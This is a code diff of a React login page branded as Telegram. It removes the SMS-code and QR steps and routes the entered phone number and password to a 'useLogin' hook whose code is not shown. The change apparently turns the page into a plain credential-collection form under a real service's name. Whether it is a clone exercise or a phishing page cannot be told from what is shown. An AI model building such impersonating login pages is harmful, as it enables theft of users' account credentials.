@@ -1,31 +1,17 @@
-import React, { useState } from 'react';
-import { MessageCircle, ArrowRight, Phone, Lock } from 'lucide-react';
+import React, { useState } from "react";
+import { MessageCircle, ArrowRight, Phone, Lock } from "lucide-react";
+import useLogin from "./useLogin";
 
 const Login = () => {
-  const [step, setStep] = useState('phone'); // 'phone', 'code', 'password'
-  const [phoneNumber, setPhoneNumber] = useState('');
-  const [code, setCode] = useState(['', '', '', '', '', '']);
-  const [password, setPassword] = useState('');
-
-  const handleCodeChange = (index, value) => {
-    if (value.length <= 1 && /^\d*$/.test(value)) {
-      const newCode = [...code];
-      newCode[index] = value;
-      setCode(newCode);
-      
-      // Auto-focus next input
-      if (value && index < 5) {
-        document.getElementById(`code-${index + 1}`).focus();
-      }
-    }
-  };
-
-  const handleCodeKeyDown = (index, e) => {
-    if (e.key === 'Backspace' && !code[index] && index > 0) {
-      document.getElementById(`code-${index - 1}`).focus();
-    }
-  };
-
+  const {
+    handleNextStep,
+    step,
+    phoneNumber,
+    setPhoneNumber,
+    password,
+    setPassword,
+    handleLogin
+  } = useLogin();
   return (
     <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
       <div className="w-full max-w-md">
@@ -36,23 +22,25 @@ const Login = () => {
           </div>
           <h1 className="text-3xl font-bold text-gray-900 mb-2">Telegram</h1>
           <p className="text-gray-600">
-            {step === 'phone' && 'Enter your phone number to get started'}
-            {step === 'code' && 'Enter the code we sent you'}
-            {step === 'password' && 'Enter your password'}
+            {step === "phone" && "Enter your phone number to get started"}
+            {step === "password" && "Enter your password"}
           </p>
         </div>
 
         {/* Login Card */}
         <div className="bg-white rounded-2xl shadow-lg p-8">
           {/* Phone Number Step */}
-          {step === 'phone' && (
+          {step === "phone" && (
             <div className="space-y-6">
               <div>
                 <label className="block text-sm font-medium text-gray-700 mb-2">
                   Phone Number
                 </label>
                 <div className="relative">
-                  <Phone className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400" size={20} />
+                  <Phone
+                    className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400"
+                    size={20}
+                  />
                   <input
                     type="tel"
                     value={phoneNumber}
@@ -64,7 +52,7 @@ const Login = () => {
               </div>
 
               <button
-                onClick={() => setStep('code')}
+                onClick={() => handleNextStep("password")}
                 disabled={!phoneNumber}
                 className="w-full bg-blue-500 hover:bg-blue-600 disabled:bg-gray-300 disabled:cursor-not-allowed text-white font-semibold py-3 rounded-xl transition flex items-center justify-center gap-2"
               >
@@ -74,72 +62,21 @@ const Login = () => {
 
               <div className="text-center">
                 <p className="text-sm text-gray-500">
-                  By continuing, you agree to our{' '}
-                  <a href="#" className="text-blue-500 hover:underline">Terms of Service</a>
-                  {' '}and{' '}
-                  <a href="#" className="text-blue-500 hover:underline">Privacy Policy</a>
-                </p>
-              </div>
-            </div>
-          )}
-
-          {/* Verification Code Step */}
-          {step === 'code' && (
-            <div className="space-y-6">
-              <div className="text-center mb-6">
-                <p className="text-sm text-gray-600">
-                  We've sent a code to
-                </p>
-                <p className="font-semibold text-gray-900 mt-1">{phoneNumber}</p>
-                <button
-                  onClick={() => setStep('phone')}
-                  className="text-blue-500 text-sm hover:underline mt-2"
-                >
-                  Change number
-                </button>
-              </div>
-
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-3 text-center">
-                  Enter Code
-                </label>
-                <div className="flex gap-2 justify-center">
-                  {code.map((digit, index) => (
-                    <input
-                      key={index}
-                      id={`code-${index}`}
-                      type="text"
-                      maxLength="1"
-                      value={digit}
-                      onChange={(e) => handleCodeChange(index, e.target.value)}
-                      onKeyDown={(e) => handleCodeKeyDown(index, e)}
-                      className="w-12 h-14 text-center text-xl font-semibold border-2 border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
-                    />
-                  ))}
-                </div>
-              </div>
-
-              <button
-                onClick={() => setStep('password')}
-                disabled={code.some(d => !d)}
-                className="w-full bg-blue-500 hover:bg-blue-600 disabled:bg-gray-300 disabled:cursor-not-allowed text-white font-semibold py-3 rounded-xl transition"
-              >
-                Verify
-              </button>
-
-              <div className="text-center">
-                <p className="text-sm text-gray-500">
-                  Didn't receive the code?{' '}
-                  <button className="text-blue-500 hover:underline font-medium">
-                    Resend
-                  </button>
+                  By continuing, you agree to our{" "}
+                  <a href="#" className="text-blue-500 hover:underline">
+                    Terms of Service
+                  </a>{" "}
+                  and{" "}
+                  <a href="#" className="text-blue-500 hover:underline">
+                    Privacy Policy
+                  </a>
                 </p>
               </div>
             </div>
           )}
 
           {/* Password Step */}
-          {step === 'password' && (
+          {step === "password" && (
             <div className="space-y-6">
               <div className="text-center mb-6">
                 <div className="inline-flex items-center justify-center w-16 h-16 bg-blue-100 rounded-full mb-4">
@@ -158,7 +95,10 @@ const Login = () => {
                   Password
                 </label>
                 <div className="relative">
-                  <Lock className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400" size={20} />
+                  <Lock
+                    className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400"
+                    size={20}
+                  />
                   <input
                     type="password"
                     value={password}
@@ -171,6 +111,7 @@ const Login = () => {
 
               <button
                 disabled={!password}
+                onClick={()=>handleLogin(phoneNumber,password)}
                 className="w-full bg-blue-500 hover:bg-blue-600 disabled:bg-gray-300 disabled:cursor-not-allowed text-white font-semibold py-3 rounded-xl transition"
               >
                 Login
@@ -183,13 +124,6 @@ const Login = () => {
               </div>
             </div>
           )}
-        </div>
-
-        {/* QR Code Option */}
-        <div className="mt-6 text-center">
-          <button className="text-blue-500 hover:underline text-sm font-medium">
-            Log in by QR Code
-          </button>
         </div>
 
         {/* Footer */}
